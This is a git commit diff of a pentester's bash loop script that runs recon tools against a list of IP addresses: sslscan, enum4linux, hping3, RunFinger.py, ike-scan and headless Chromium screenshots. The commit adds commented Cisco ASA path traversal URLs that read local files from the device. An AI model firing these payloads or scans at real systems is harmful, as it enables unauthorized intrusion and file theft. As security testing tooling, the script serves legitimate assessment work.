d95e434e5d310700e2e19836288d7c0482a80fbb
Bill Harshbarger <35038562+bharshbarger-r7@users.noreply.github.com>
2020-12-30 16:02:50 -0600

    Update loop.sh

--- loop.sh
+++ loop.sh
@@ -1,8 +1,9 @@
-#automate running of sslscan (or basically anything else if you replace sslscan with whatevers in your path you wanna iterate)
+#automate running of various tools on a line separated file of IP addresses
+#uncomment what youd like to run for now because i suck at bash scripting
 #based on https://unix.stackexchange.com/questions/7011/how-to-loop-over-the-lines-of-a-file
 #usage is ./sslscan.sh <inputfile>
-#can pipe output wherever
 
+#useful command:
 #expand cidr with nmap
 #nmap -sL -n -iL $file | grep 'Nmap scan report for' | cut -f 5 -d ' '
 
@@ -11,22 +12,30 @@ IFS=$'\n'       # make newlines the only separator
 set -f          # disable globbing
 
 while IFS= read -r line; do
-    #set up a case here for cmdline switch?
-    
+
+    #need to work on this one wrt filenames
+    # asa file disclosure https://$line/+CSCOT+/translationtable?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+    # https://$line/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/[LOCAL-FILE]
+
     #sslscan an ip
     #sslscan "$line"
-    
+
     #curl an ip (or list of urls) and intercept with a local proxy like burp
     #curl --get --insecure --proxy 127.0.0.1:8080 $line
-    
+
     #run enum4linux
     #enum4linux $line
-    
-    #test for tcp timestamps
-    #hping3 -S -c 2 $line -p 445 --tcp-timestamp
-    
+
+    #test for tcp timestamps, edit the port number you are attempting
+    #hping3 -S -c 2 $line -p 443 --tcp-timestamp
+
     #Responder's RunFinger.py with greppable output
     #./RunFinger.py -g -i $line
-    
+
+    #chromium web screenshot
+    #chromium --headless --disable-gpu --screenshot https://$line
+
+    #ike aggressive mode check
+    #sudo ike-scan -M -A -n foo $line -P
     wait
-done < "$1" 
+done < "$1"
